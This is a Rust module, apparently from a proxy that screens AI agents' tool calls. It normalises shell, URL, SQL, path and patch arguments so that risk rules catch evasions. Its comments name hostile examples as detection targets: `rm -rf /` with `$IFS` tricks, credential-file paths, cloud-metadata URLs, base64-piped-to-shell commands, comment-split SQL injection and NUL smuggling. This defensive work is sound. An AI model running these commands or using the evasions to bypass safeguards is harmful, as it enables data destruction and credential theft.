//! Field-typed normalisers for tool-risk-rule matching.
//!
//! Each `Normalizer` kind canonicalises a raw arg value into a deterministic
//! representation so rules don't have to encode every spacing / casing /
//! encoding variant a model might emit. The set is hardcoded — adding a new
//! kind requires a code change here (see [`Normalizer`]). Operators choose intent (declare a field as `shell`,
//! `url`, `sql`, etc.); the engine owns interpretation.
//!
//! All functions are pure and operate on `&str`. None of them touch the
//! filesystem, resolve DNS, or make network calls — `path` in particular
//! does NOT expand `~` (proxy host ≠ agent host) and does NOT resolve
//! symlinks.
//!
//! Coverage:
//!
//! | normaliser | input                                          | canonical output                          |
//! |------------|------------------------------------------------|-------------------------------------------|
//! | `shell`    | `"rm  -rf /tmp/x"` or `"bash -c 'rm -rf /'"`   | `"rm -rf /tmp/x"` (space-joined argv)     |
//! | `shell`    | `"rm$IFS-rf"` or `"rm${IFS%??}-rf"`            | `"rm -rf"` (IFS evasion expanded)         |
//! | `url`      | `"HTTPS://Metadata.Google.INTERNAL/v1%2Fx"`    | `"https://169.254.169.254/v1/x"`          |
//! | `sql`      | `"DROP\n  TABLE  /* x */ users"`               | `"drop table users"`                      |
//! | `sql`      | `"UN/**/ION SEL/**/ECT"`                       | `"union select\u{0}un ion sel ect"` (dual-form) |
//! | `path`     | `"~/.aws/../.aws/credentials"`                  | `"~/.aws/credentials"` (lexical only)     |
//! | `patch`    | `"*** Update File: a/../.ssh/config\n…"`       | `".ssh/config"` (a `path` form per file)  |
//! | `raw`      | identity                                        | identity, less the form separator (below) |
//!
//! ## Multi-form output
//!
//! Normalisers may emit more than one canonical form when an evasion creates
//! a genuine ambiguity, or when one value names several things. `patch` is
//! the second case: a patch edits several files, and each is a form. The
//! SQL normaliser is the first: a comment
//! between word characters could be a token-splitter (`UN/**/ION`, defeated
//! by stripping the comment with empty replacement → `UNION`) or a
//! separator (`SELECT/*x*/FROM`, defeated by stripping with space → `SELECT
//! FROM`). Both forms are returned by [`apply_forms`] and the matcher
//! (`tool_rules::evaluate`) any-matches across them, so a single rule catches
//! either evasion.
//!
//! **Ask for the forms as a list.** [`apply`] joins them with `\u{0}`
//! ([`MULTIFORM_SEP`]) for a caller that needs one value, but a matcher that
//! re-split that string would be reading a boundary it cannot attribute: `url`
//! percent-decodes, so `%00` in an argument arrives as a literal NUL and would
//! cut the canonical value wherever the attacker chose — a needle spanning the
//! cut then matches nothing. No form may carry the separator, and
//! [`apply_forms`] enforces that on every pass rather than assuming the passes
//! never produce one.
//!
//! ## Decoding policy: single-pass only
//!
//! Each normaliser performs at most one decode pass (percent for `url`,
//! comment-strip for `sql`, IFS-expand for `shell`). Layered re-decoding
//! (decode the percent-decoded output again, recursively decode base64
//! payloads, etc.) is intentionally NOT done — over-decoding creates new
//! false positives and arms-races attackers who'll just add another layer.
//! Multi-stage patterns are matched by a named detector instead, which can
//! read the *shape* of the chain without decoding anything:
//! `is_piped_exec` for `echo <b64> | base64 -d | sh`, `is_double_encoded_url`
//! for `%2570`, `is_obfuscated_sql` for keyword assembly, and
//! `is_confusable_text` for lookalike substitution
//! (`crate::config::tool_rules_detectors`).

// This module canonicalises untrusted input (shell args, URLs, SQL, paths)
// where multi-byte UTF-8 is routine. Every `&str` slice site here must be
// justified — by `floor_char_boundary`, an ASCII-delimiter `find`, or
// `starts_with`. The lint forces new unannotated sites to surface at build
// time so the original panic-by-byte-index can't recur silently.
#![warn(clippy::string_slice)]

use std::borrow::Cow;

use serde::{Deserialize, Serialize};
use utoipa::ToSchema;

/// Hardcoded normaliser kinds. Adding one requires a new variant here and a
/// new arm in [`apply_forms`], and an entry in [`Normalizer::ALL`]; the
/// console's two normaliser lists (the profile editor's picker and the
/// Field Profiles filter) are kept by hand beside it.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize, ToSchema)]
#[serde(rename_all = "snake_case")]
pub enum Normalizer {
    /// POSIX shell tokenise → space-joined argv. Recursively unwraps
    /// `bash -c <STRING>` / `sh -c <STRING>` / `python -c <STRING>` so
    /// the inner command is canonicalised too.
    Shell,
    /// Percent-decode, lowercase scheme & host, alias known cloud-metadata
    /// hostnames to their link-local IPs. Path / query / fragment preserved.
    Url,
    /// Lowercase, strip `--…\n` and `/* … */` comments, collapse runs of
    /// whitespace to a single space.
    Sql,
    /// Lexical path normalisation only: collapse `..`, normalise separator
    /// (`\\` → `/`), trim trailing `/`. NEVER expands `~`, NEVER resolves
    /// symlinks, NEVER touches the filesystem.
    Path,
    /// The files a patch envelope (`*** Begin Patch` … `*** End Patch`, the
    /// format of Codex's `apply_patch` and OpenCode's `patch`) adds, deletes,
    /// updates or moves to — one `path`-normalised form per file.
    Patch,
    /// Identity. Explicit no-op for fields that are intentionally low-risk
    /// — distinguishes "we considered this" from "no profile registered".
    Raw,
}

impl Normalizer {
    /// Every kind, for a surface that lists them (the expert's
    /// profile-suggestion schema). The exhaustive match in [`Self::as_str`]
    /// does not see this list, so a new variant must be added here too.
    pub const ALL: [Normalizer; 6] = [
        Normalizer::Shell,
        Normalizer::Url,
        Normalizer::Sql,
        Normalizer::Path,
        Normalizer::Patch,
        Normalizer::Raw,
    ];

    /// String tag used in seed JSON / wire types — matches the serde rename.
    pub fn as_str(self) -> &'static str {
        match self {
            Normalizer::Shell => "shell",
            Normalizer::Url => "url",
            Normalizer::Sql => "sql",
            Normalizer::Path => "path",
            Normalizer::Patch => "patch",
            Normalizer::Raw => "raw",
        }
    }
}

/// Apply the chosen normaliser, returning the canonical **forms** to match
/// against — one, or more where an evasion creates a genuine ambiguity (see
/// the module docs). A condition matches when ANY form does.
///
/// No form may contain [`MULTIFORM_SEP`]. The separator is structure, and the
/// list is the only thing entitled to carry it — which is enforced here rather
/// than trusted, because a normaliser manufactures one from its input without
/// meaning to: `url` percent-decodes, so `%00` arrives as a literal NUL, and a
/// caller re-splitting a joined value would read an attacker-chosen boundary as
/// one of ours. Dropping it also keeps the canonical value on the
/// over-normalising side — `evil.com/pa%00th` reads as `evil.com/path`, which
/// is the string an operator's needle names. Removal picks one reading rather
/// than offering two, and it is the right one for every pass here: no SQL
/// engine or shell treats a NUL as a token separator, so gluing the halves
/// together is what the target would have executed.
///
/// Pure; never panics.
pub fn apply_forms(normalizer: Normalizer, value: &str) -> Vec<String> {
    // Removed on the way IN and again on the way OUT, for two different
    // reasons. In: no pass may see a separator as content, or it canonicalises
    // *around* a character that is then taken back out — `sql` would collapse
    // `"\0\nUNION"` to `"\0 union"` and hand back `" union"`, breaking its own
    // trimmed-and-collapsed contract. Out: `url` percent-decodes, so `%00` is
    // an argument manufacturing a separator mid-pass, which no input strip can
    // reach.
    let value: Cow<'_, str> = if value.contains(MULTIFORM_SEP) {
        Cow::Owned(value.chars().filter(|c| *c != MULTIFORM_SEP).collect())
    } else {
        Cow::Borrowed(value)
    };
    let mut forms = match normalizer {
        Normalizer::Shell => vec![normalize_shell(&value)],
        Normalizer::Url => vec![normalize_url(&value)],
        Normalizer::Sql => normalize_sql_forms(&value),
        Normalizer::Path => vec![normalize_path(&value)],
        Normalizer::Patch => normalize_patch_forms(&value),
        Normalizer::Raw => vec![value.into_owned()],
    };
    for form in &mut forms {
        form.retain(|c| c != MULTIFORM_SEP);
    }
    forms
}

/// [`apply_forms`] as a single string, forms joined by [`MULTIFORM_SEP`].
/// Matching wants the list, and every matcher path takes it; this is the
/// single-value spelling, for a caller that wants one canonical string and is
/// content to see the readings run together.
pub fn apply(normalizer: Normalizer, value: &str) -> String {
    apply_forms(normalizer, value).join(&MULTIFORM_SEP.to_string())
}

// ─── shell ────────────────────────────────────────────────────────────────

/// Recursion bound for `bash -c "<inner>"` unwrapping. A single canonical
/// command never needs more than 2 levels in practice; this stops a
/// hand-crafted `bash -c "bash -c \"...\""` chain from exploding stack.
const SHELL_MAX_RECURSION: usize = 4;

/// POSIX shell tokenise + space-join. Multi-statement commands (split on
/// `;`, `&&`, `||`, `|`, `\n`) are tokenised independently and re-joined
/// with the same separator so structural cues stay matchable. `bash -c`,
/// `sh -c`, `python -c`, `python3 -c` wrappers are unwrapped recursively.
///
/// IFS-expansion evasions (`rm$IFS-rf`, `rm${IFS}-rf`, `rm${IFS%??}-rf`)
/// are expanded to a literal space before tokenisation so the canonical
/// form matches a plain `rm -rf` rule. The expansion is deliberately
/// quote-unaware: replacing `$IFS` inside a single-quoted literal slightly
/// distorts the canonical form but never opens a bypass — over-normalising
/// is the safe direction for security policy.
///
/// On unparseable input (mismatched quotes etc.), falls back to the
/// whitespace-collapsed original — never empties the value, since downstream
/// `contains_any` rules rely on something non-empty being there.
fn normalize_shell(input: &str) -> String {
    normalize_shell_at(input, 0)
}

fn normalize_shell_at(input: &str, depth: usize) -> String {
    if depth >= SHELL_MAX_RECURSION {
        return input.split_whitespace().collect::<Vec<_>>().join(" ");
    }

    let expanded = expand_ifs_evasions(input);

    // Pre-split on shell statement separators so each clause canonicalises
    // independently. Order-preserving — we want `rm -rf /; echo ok` to read
    // back as `rm -rf / ; echo ok` rather than `echo ok rm -rf /`.
    let segments = split_shell_statements(&expanded);
    let mut out = Vec::with_capacity(segments.len() * 2);
    for (idx, seg) in segments.iter().enumerate() {
        let (text, sep) = seg;
        let canon = canonicalise_one_statement(text, depth);
        if !canon.is_empty() {
            out.push(canon);
        }
        if let Some(s) = sep
            && idx + 1 < segments.len()
        {
            out.push((*s).to_string());
        }
    }
    out.join(" ")
}

/// Expand shell-builtin evasions that abuse parameter expansion to inject
/// whitespace without writing a literal space. Recognises `$IFS` and
/// `${IFS...}` (any body up to the matching `}`) and replaces with a single
/// space so the downstream tokeniser sees `rm -rf` instead of `rm$IFS-rf`.
///
/// Scope: `$IFS` only. NOT a general parameter-expansion or quote
/// expander — sibling evasions like `$NONEXISTENT` (empty-var token
/// concatenation), `$@` / `$*` no-arg expansion, mixed-case `$IFs`
/// (different variable in bash), and command substitution `$(…)` are out
/// of scope; those are matched by shape in
/// `crate::config::tool_rules_detectors` rather than expanded here.
///
/// Quote-unaware by design — a `$IFS` inside `'literal $IFS string'` will
/// also be expanded. The cost is slightly distorted canonical form for
/// non-attack inputs that mention `$IFS` literally; the benefit is no
/// silent bypass when an attacker tries to hide the expansion behind a
/// quote level the parser couldn't track without a full shell grammar.
fn expand_ifs_evasions(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let bytes = input.as_bytes();
    let mut iter = input.char_indices().peekable();
    while let Some((i, c)) = iter.next() {
        if c == '$' {
            // ${IFS<anything>} — match any body up to the next '}'. The
            // bounded scan stops at the first `}`, so a missing close-brace
            // (`${IFS...` to EOF) leaves the `$` as a literal — that's the
            // safer fallback than consuming to EOF.
            if bytes.get(i + 1) == Some(&b'{') && bytes.get(i + 2..i + 5) == Some(b"IFS") {
                let search_from = i + 5;
                #[allow(clippy::string_slice)]
                if let Some(rel) = input[search_from..].find('}') {
                    out.push(' ');
                    let target = search_from + rel + 1;
                    while let Some(&(j, _)) = iter.peek() {
                        if j >= target {
                            break;
                        }
                        iter.next();
                    }
                    continue;
                }
            }
            // $IFS — must terminate at a non-identifier character (or EOF).
            // Without this guard, `$IFSPATH` would partial-match and leave
            // `PATH` dangling.
            if bytes.get(i + 1..i + 4) == Some(b"IFS") {
                let next_byte = bytes.get(i + 4);
                let next_is_ident =
                    matches!(next_byte, Some(b) if b.is_ascii_alphanumeric() || *b == b'_');
                if !next_is_ident {
                    out.push(' ');
                    let target = i + 4;
                    while let Some(&(j, _)) = iter.peek() {
                        if j >= target {
                            break;
                        }
                        iter.next();
                    }
                    continue;
                }
            }
        }
        out.push(c);
    }
    out
}

/// One pass: tokenise via shlex, recognise `bash -c <STRING>` and friends,
/// recurse. Falls back to whitespace-collapsed text if shlex can't parse.
fn canonicalise_one_statement(text: &str, depth: usize) -> String {
    let trimmed = text.trim();
    if trimmed.is_empty() {
        return String::new();
    }
    let Some(tokens) = shlex::split(trimmed) else {
        return trimmed.split_whitespace().collect::<Vec<_>>().join(" ");
    };
    if tokens.is_empty() {
        return String::new();
    }

    // Recognise `<interpreter> [options] -c … <STRING> [args...]` and recurse
    // into the embedded command (`dash_c_command_at` says which token it is).
    // Anything after it is positional args to the inner script (`$0`, `$1`,
    // ...) and is left as-is.
    if let Some(at) = dash_c_command_at(&tokens) {
        // Re-emit the interpreter and its options, then the recursed inner,
        // then any trailing positional args.
        let mut head: Vec<String> = tokens[..at].to_vec();
        let recursed = normalize_shell_at(&tokens[at], depth + 1);
        head.push(recursed);
        head.extend(tokens.into_iter().skip(at + 1));
        return head.join(" ");
    }

    tokens.join(" ")
}

/// Whether `token` is the `-c` that hands an interpreter its command: `-c`
/// itself, or a cluster of single-letter flags holding it (`-lc`, `-ec`,
/// `-xc` — Codex runs every command as `bash -lc …`).
fn is_dash_c_flag(token: &str) -> bool {
    token.strip_prefix('-').is_some_and(|flags| {
        !flags.is_empty() && flags.bytes().all(|b| b.is_ascii_alphabetic()) && flags.contains('c')
    })
}

/// The POSIX-style shells: given `-c`, they run their first OPERAND — the
/// first argument that is not an option or an option's value — so
/// `bash -c -e 'cmd'` and `bash -ec -c 'cmd'` both run `cmd`.
const OPERAND_SHELLS: &[&str] = &["bash", "sh", "zsh", "ksh", "dash"];

/// Those shells' long options that take the following word as their value.
const SHELL_LONG_VALUE_OPTIONS: &[&str] = &["rcfile", "init-file"];

/// Index of the command an interpreter's `-c` runs, or `None` when the
/// invocation has no `-c` (a script file, a bare interpreter).
///
/// A POSIX-style shell runs its first operand once an option cluster held
/// `c`. Its options are read as the shell reads them: each `o`/`O` in a
/// cluster (`-o`, `-euo`, `+O`) takes one following word as its value, so do
/// `--rcfile` and `--init-file`, and `--` or a lone `-` ends the options.
/// Should that reading find no command where a `-c` is present (an option
/// this list does not know takes a value), the first word after the first
/// cluster holding `c` that is not an option is read instead: a misread
/// option table must never hide the command a plain `-c` names.
///
/// Any other interpreter (`fish`, `python`, `ruby`, `perl`) takes the command
/// as the `-c` option's own argument — the word right after the first `-c`
/// or cluster ending in `c`. Where that `c` means something else (a syntax check for `perl`
/// and `ruby`), the argument is still read as a command: shell-tokenised, so a
/// rule matching its literal spacing can miss it, while a rule on its words
/// reads them.
fn dash_c_command_at<S: AsRef<str>>(tokens: &[S]) -> Option<usize> {
    let program = tokens.first()?.as_ref();
    if !is_shell_dash_c_interpreter(program) {
        return None;
    }
    let base = program.rsplit('/').next().unwrap_or(program);
    if !OPERAND_SHELLS.contains(&base) {
        // `-c` takes the command as its argument: the first bare `-c`, or
        // cluster that `c` closes (`-Ic` is `-I -c`), is the interpreter's.
        // Best effort: an option with a value attached that ends in `c`
        // (`-Xtracemalloc`) reads as one.
        let flag = tokens.iter().position(|t| {
            let t = t.as_ref();
            is_dash_c_flag(t) && t.ends_with('c')
        })?;
        return (flag + 1 < tokens.len()).then_some(flag + 1);
    }
    first_operand_after_dash_c(tokens).or_else(|| {
        // The interpreter's own `-c` comes before its command, and the
        // command's words follow it (in the flattened stream, flags such as
        // `wc -c` among them): read from the FIRST cluster holding `c`, past
        // any options, to the first word that is not one.
        let flag = tokens.iter().position(|t| is_dash_c_flag(t.as_ref()))?;
        tokens.iter().enumerate().skip(flag + 1).find(|(_, t)| !is_option_word(t.as_ref())).map(|(idx, _)| idx)
    })
}

/// Whether a shell word is an option (`-x`, `+o`, `--login`) rather than an
/// operand. A lone `-` is not one: it ends the options.
fn is_option_word(token: &str) -> bool {
    token.len() > 1 && (token.starts_with('-') || token.starts_with('+'))
}

/// A POSIX shell's first operand, when an option cluster before it held `c`.
fn first_operand_after_dash_c<S: AsRef<str>>(tokens: &[S]) -> Option<usize> {
    let mut saw_c = false;
    let mut pending_values = 0usize;
    let mut options_ended = false;
    for (idx, token) in tokens.iter().enumerate().skip(1) {
        let token = token.as_ref();
        if pending_values > 0 {
            pending_values -= 1;
            continue;
        }
        if !options_ended {
            if token == "--" || token == "-" {
                options_ended = true;
                continue;
            }
            if let Some(long) = token.strip_prefix("--") {
                pending_values = usize::from(SHELL_LONG_VALUE_OPTIONS.contains(&long));
                continue;
            }
            if is_option_word(token) && let Some(flags) = token.strip_prefix(['-', '+']) {
                saw_c |= is_dash_c_flag(token);
                pending_values = flags.chars().filter(|c| matches!(c, 'o' | 'O')).count();
                continue;
            }
        }
        return saw_c.then_some(idx);
    }
    None
}

fn is_shell_dash_c_interpreter(prog: &str) -> bool {
    // Compare basename — `/bin/bash`, `/usr/bin/python3`, etc.
    let base = prog.rsplit('/').next().unwrap_or(prog);
    matches!(
        base,
        "bash" | "sh" | "zsh" | "ksh" | "dash" | "fish" | "python" | "python3" | "ruby" | "perl"
    )
}

/// A command wrapper: something whose own arguments are another command, so
/// the command it runs — not the wrapper — is what a rule reading argv
/// position 0 means. Everything between the two is the wrapper's own flags or
/// `VAR=value` environment assignments.
///
/// Both fields are per-wrapper because the same spelling means different things
/// to different wrappers: `-i` is a boolean for `sudo` (login shell) and `env`
/// (empty environment) but takes a value for `stdbuf` (input buffering mode),
/// and `timeout` is the only entry whose first operand is its own.
///
/// **`xargs` is deliberately absent, and that is a decision rather than an
/// omission.** It does not exec its tail verbatim — it *builds* commands from
/// what arrives on stdin, so its command is a template (`-I{}`) and its own
/// options take values. Peeling it would offer a template as a command; left
/// alone it reads as its own head, which is a miss rather than a wrong answer.
struct ArgvWrapper {
    /// Basename that introduces the wrapper.
    name: &'static str,
    /// This wrapper's flags that consume the FOLLOWING token as their value.
    /// A flag not listed is read as a boolean, which costs a peel; listing one
    /// that does not take a value is the dangerous direction, because the peel
    /// then eats the wrapped command and offers its argument as the head.
    value_flags: &'static [&'static str],
    /// Recogniser for an operand of the wrapper's own, sitting between its
    /// flags and the command (`timeout <DURATION> cmd` — the only shape here
    /// that has one). Recognised by shape so an invocation that is not that
    /// shape peels nothing instead of calling an argument the command.
    leading_operand: Option<fn(&str) -> bool>,
}

const ARGV_WRAPPERS: &[ArgvWrapper] = &[
    ArgvWrapper { name: "builtin", value_flags: &[], leading_operand: None },
    ArgvWrapper { name: "command", value_flags: &[], leading_operand: None },
    ArgvWrapper { name: "doas", value_flags: &["-a", "-C", "-u"], leading_operand: None },
    // `env`'s `-S`/`--split-string` is NOT a value flag here: its argument IS
    // the command, which arrives as ordinary tokens once the value is split.
    ArgvWrapper {
        name: "env",
        value_flags: &["-C", "-u", "--chdir", "--unset"],
        leading_operand: None,
    },
    ArgvWrapper { name: "exec", value_flags: &["-a"], leading_operand: None },
    ArgvWrapper { name: "nohup", value_flags: &[], leading_operand: None },
    ArgvWrapper { name: "setsid", value_flags: &[], leading_operand: None },
    ArgvWrapper {
        name: "stdbuf",
        value_flags: &["-e", "-i", "-o", "--error", "--input", "--output"],
        leading_operand: None,
    },
    ArgvWrapper {
        name: "sudo",
        value_flags: &[
            "-C", "-D", "-R", "-T", "-U", "-g", "-h", "-p", "-r", "-t", "-u", "--chdir",
            "--chroot", "--close-from", "--command-timeout", "--group", "--host", "--other-user",
            "--prompt", "--role", "--type", "--user",
        ],
        leading_operand: None,
    },
    ArgvWrapper {
        name: "time",
        value_flags: &["-f", "-o", "--format", "--output"],
        leading_operand: None,
    },
    ArgvWrapper {
        name: "timeout",
        value_flags: &["-k", "-s", "--kill-after", "--signal"],
        leading_operand: Some(is_duration_operand),
    },
];

/// The applet dispatcher. Not an [`ArgvWrapper`]: it consumes no flags before
/// the command, because the token after it names a *builtin applet* rather than
/// a program — `busybox sh -c …` IS a shell, reached through no wrapper at all.
/// Its own options (`--list`, `--help`) name no applet, so a leading `-` means
/// there is no wrapped command to peel to.
const APPLET_DISPATCHER: &str = "busybox";

/// Whether a token has the shape of a `timeout` DURATION: digits, an optional
/// fraction, and an optional unit suffix (`5`, `0.5`, `10s`, `2m`, `1h`, `7d`).
/// A bare `0` — `timeout`'s "wait forever" — is covered by the same shape.
fn is_duration_operand(token: &str) -> bool {
    let digits = token.strip_suffix(['s', 'm', 'h', 'd']).unwrap_or(token);
    digits.chars().all(|c| c.is_ascii_digit() || c == '.')
        && digits.chars().any(|c| c.is_ascii_digit())
}

fn argv_wrapper(base: &str) -> Option<&'static ArgvWrapper> {
    ARGV_WRAPPERS.iter().find(|w| w.name == base)
}

/// Bound on wrapper peeling (`sudo env nohup cmd`). Each layer emits its own
/// candidate argv, so this also bounds the form count per statement.
const ARGV_MAX_UNWRAP: usize = 4;

/// Recover argument vectors from a `shell`-normalised value.
///
/// Returns one entry per *candidate command* — the token list a rule reading
/// `argv[0]` should be able to match. There is more than one per input for two
/// reasons, and both are the difference between a working rule and a bypassed
/// one:
///
/// - **A statement per command.** `normalize_shell` re-emits `;` / `&&` / `||`
///   / `|` as standalone tokens, so `echo hi; rm -rf /` is one string whose
///   first token is `echo`. Reading position 0 of the whole string would let
///   any leading command shield the rest, exactly as scanning a chained SQL
///   statement for its verb would.
/// - **A layer per wrapper.** `sudo rm -rf /` and `bash -c "rm -rf /"` are
///   spelled with `rm` in position 1 and 2; both are emitted alongside the
///   literal vector, so `argv[0] in ["rm"]` matches the wrapped command AND
///   `argv[0] in ["sudo"]` still matches the wrapper. A wrapper's own flags
///   and operand are skipped per [`ArgvWrapper`], and `busybox`'s applet is
///   reached the same way — a command behind a layer this table does not know
///   is invisible to every consumer that reads a command's head.
///
/// Tokens come from the normalised form, which is `shlex`-split and re-joined
/// with single spaces — so an argument that contained whitespace inside quotes
/// arrives here as several tokens. That costs nothing at position 0 (a command
/// name has no spaces) and is why this reads the normalised value rather than
/// re-parsing the raw one, which would forfeit `$IFS` expansion and `-c`
/// unwrapping.
pub fn shell_argv(normalized: &str) -> Vec<Vec<&str>> {
    let mut out: Vec<Vec<&str>> = Vec::new();
    for statement in split_normalized_statements(normalized) {
        let mut current: &[&str] = &statement;
        for _ in 0..=ARGV_MAX_UNWRAP {
            if current.is_empty() {
                break;
            }
            out.push(current.to_vec());
            match strip_one_wrapper(current) {
                Some(next) => current = next,
                None => break,
            }
        }
    }
    out
}

/// Cut the normalised form into per-command token lists. Splits on the
/// separator *characters* rather than the standalone separator tokens, so a
/// statement chain survives even in the fallback path where `normalize_shell`
/// could not parse the input and returned it whitespace-collapsed with its
/// punctuation still glued to words (`rm -rf /;echo ok`).
fn split_normalized_statements(normalized: &str) -> Vec<Vec<&str>> {
    normalized
        .split(|c: char| ";|&\n".contains(c))
        .map(|segment| segment.split_whitespace().collect::<Vec<_>>())
        .filter(|tokens: &Vec<&str>| !tokens.is_empty())
        .collect()
}

/// Peel one wrapper layer, returning the tokens of the command it wraps.
/// `None` when the head is not a wrapper, or when peeling would leave nothing.
fn strip_one_wrapper<'a, 's>(tokens: &'a [&'s str]) -> Option<&'a [&'s str]> {
    let head = *tokens.first()?;
    let base = head.rsplit('/').next().unwrap_or(head);
    if base == APPLET_DISPATCHER {
        let rest = tokens.get(1..)?;
        return (!rest.first()?.starts_with('-')).then_some(rest);
    }
    if let Some(wrapper) = argv_wrapper(base) {
        let rest = tokens.get(1..)?;
        // Walk the wrapper's own arguments to the first token that is neither.
        // Positions come from `enumerate`, never from a counter this loop keeps:
        // an index the body has to advance is an unbounded loop one edit away,
        // and no assertion can observe a scan that never terminates.
        let mut skip_value = false;
        let mut command_at = rest.len();
        for (idx, token) in rest.iter().enumerate() {
            if skip_value {
                skip_value = false;
                continue;
            }
            // `VAR=value` is an environment assignment, not the command.
            if token.contains('=') {
                continue;
            }
            if !token.starts_with('-') {
                command_at = idx;
                break;
            }
            // A flag that consumes the next token must take it along, or the
            // value reads as the wrapped command — `sudo -u root rm -rf /`
            // would otherwise offer `root` at position 0 and never `rm`.
            skip_value = wrapper.value_flags.contains(token);
        }
        let mut wrapped = rest.get(command_at..)?;
        // An operand of the wrapper's own separates its flags from the command.
        // It is skipped only when it has the shape the wrapper documents:
        // anything else means this is not that invocation, and peeling on would
        // call one of the wrapper's arguments the command.
        if let Some(has_operand_shape) = wrapper.leading_operand {
            if !has_operand_shape(wrapped.first()?) {
                return None;
            }
            wrapped = wrapped.get(1..)?;
        }
        return (!wrapped.is_empty()).then_some(wrapped);
    }
    // The normaliser already flattened the `-c` argument into this token
    // stream, so the wrapped command begins where that argument stood.
    if let Some(at) = dash_c_command_at(tokens) {
        return tokens.get(at..);
    }
    None
}

/// Split on shell statement separators while remembering which separator
/// terminated each segment, so the canonical form can re-emit them.
fn split_shell_statements(input: &str) -> Vec<(String, Option<&'static str>)> {
    // Two-char separators must come first so `&&` doesn't get split into two
    // single `&` tokens (which we don't recognise as a separator anyway, but
    // the principle holds for `||` too).
    let separators: &[(&str, &'static str)] = &[
        ("&&", "&&"),
        ("||", "||"),
        ("|", "|"),
        (";", ";"),
        ("\n", ";"),
    ];
    let mut segments = Vec::new();
    let mut buf = String::new();
    let mut chars = input.char_indices().peekable();
    while let Some((i, c)) = chars.next() {
        let mut matched: Option<(&str, &'static str, usize)> = None;
        // `i` comes from char_indices() so input[i..] is always a valid &str.
        // `starts_with` is byte-safe even when the literal-length offset
        // would land mid-codepoint.
        #[allow(clippy::string_slice)]
        let tail = &input[i..];
        for (lit, canon) in separators {
            if tail.starts_with(*lit) {
                matched = Some((lit, canon, lit.len()));
                break;
            }
        }
        if let Some((_, canon, len)) = matched {
            segments.push((buf.clone(), Some(canon)));
            buf.clear();
            // Skip the rest of the multi-char separator
            for _ in 1..len {
                chars.next();
            }
            continue;
        }
        buf.push(c);
    }
    if !buf.is_empty() {
        segments.push((buf, None));
    } else if segments.is_empty() {
        // Fully empty input → emit one empty segment so the join yields "".
        segments.push((String::new(), None));
    }
    segments
}

// ─── url ──────────────────────────────────────────────────────────────────

/// Cloud-metadata-endpoint aliases. Hostnames on the right canonicalise
/// to the link-local IP on the left so a rule that targets one shape
/// catches the others. Order-stable so additions are deterministic.
const METADATA_HOST_ALIASES: &[(&str, &str)] = &[
    ("metadata.google.internal", "169.254.169.254"),
    ("metadata.googleapis.com", "169.254.169.254"),
    ("metadata.azure.com", "169.254.169.254"),
    ("instance-data.ec2.internal", "169.254.169.254"),
    ("instance-data", "169.254.169.254"),
];

fn normalize_url(input: &str) -> String {
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    // Split scheme://authority/path?query#fragment without pulling in `url`
    // crate. We only need: lowercase scheme, lowercase host, alias known
    // metadata hosts. Userinfo, port, and path are passed through after
    // percent-decoding.
    let decoded = percent_decode_lossy(trimmed);
    // All slices below use indices from `find`/`rfind` of ASCII delimiters
    // (`://`, `/`, `?`, `#`, `@`, `:`); each delimiter is single-byte so the
    // returned index, plus the literal length where applicable, lands on a
    // valid char boundary regardless of multi-byte content elsewhere.
    #[allow(clippy::string_slice)]
    let (scheme, rest) = match decoded.find("://") {
        Some(i) => (&decoded[..i], &decoded[i + 3..]),
        None => return decoded.to_ascii_lowercase(),
    };
    let host_end = rest
        .find(['/', '?', '#'])
        .unwrap_or(rest.len());
    #[allow(clippy::string_slice)]
    let authority = &rest[..host_end];
    #[allow(clippy::string_slice)]
    let tail = &rest[host_end..];

    #[allow(clippy::string_slice)]
    let (userinfo, host_port) = match authority.rfind('@') {
        Some(at) => (Some(&authority[..at]), &authority[at + 1..]),
        None => (None, authority),
    };
    #[allow(clippy::string_slice)]
    let (host, port) = match host_port.rfind(':') {
        Some(p) if !host_port.contains(']') => (&host_port[..p], Some(&host_port[p..])),
        _ => (host_port, None),
    };
    let host_lower = host.to_ascii_lowercase();
    let canon_host = METADATA_HOST_ALIASES
        .iter()
        .find_map(|(alias, canon)| (host_lower == *alias).then_some(*canon))
        .map(|s| s.to_string())
        .unwrap_or(host_lower);

    let mut out = String::with_capacity(decoded.len());
    out.push_str(&scheme.to_ascii_lowercase());
    out.push_str("://");
    if let Some(u) = userinfo {
        out.push_str(u);
        out.push('@');
    }
    out.push_str(&canon_host);
    if let Some(p) = port {
        out.push_str(p);
    }
    out.push_str(tail);
    out
}

/// Lossy percent-decoding — invalid `%XX` sequences are kept verbatim. We
/// don't pull in `percent-encoding` for one short helper; the implementation
/// is ~25 lines and exercise-tested.
fn percent_decode_lossy(input: &str) -> String {
    let bytes = input.as_bytes();
    let mut out: Vec<u8> = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hi = hex_nybble(bytes[i + 1]);
            let lo = hex_nybble(bytes[i + 2]);
            if let (Some(h), Some(l)) = (hi, lo) {
                out.push((h << 4) | l);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    String::from_utf8_lossy(&out).into_owned()
}

fn hex_nybble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b - b'0'),
        b'a'..=b'f' => Some(b - b'a' + 10),
        b'A'..=b'F' => Some(b - b'A' + 10),
        _ => None,
    }
}

// ─── sql ──────────────────────────────────────────────────────────────────

/// Sentinel separator for multi-form output. See module-level docs.
pub const MULTIFORM_SEP: char = '\u{0}';

fn normalize_sql_forms(input: &str) -> Vec<String> {
    // Block comments are stripped two ways and the matcher any-matches
    // across both forms:
    //
    //   - empty replacement defeats *intra-keyword* evasion: `UN/**/ION`
    //     → `UNION`, so a rule `contains "union"` fires.
    //   - space replacement defeats *inter-keyword* obfuscation where the
    //     comment was acting as a separator: `UNION/* */SELECT` →
    //     `UNION SELECT`, so a rule `contains "union select"` fires.
    //
    // When both forms collapse to the same string (the common case — most
    // real SQL has whitespace around comments), there is one canonical form.
    // This is the only normaliser that returns two, and returning them as a
    // list rather than a delimited string is what keeps the ambiguity it is
    // modelling from being confusable with one an argument smuggled in.
    let with_space = strip_block_comments(input, " ");
    let with_empty = strip_block_comments(input, "");
    let space_form = strip_lines_lower_collapse(&with_space);
    let empty_form = strip_lines_lower_collapse(&with_empty);
    if space_form == empty_form {
        vec![space_form]
    } else {
        vec![empty_form, space_form]
    }
}

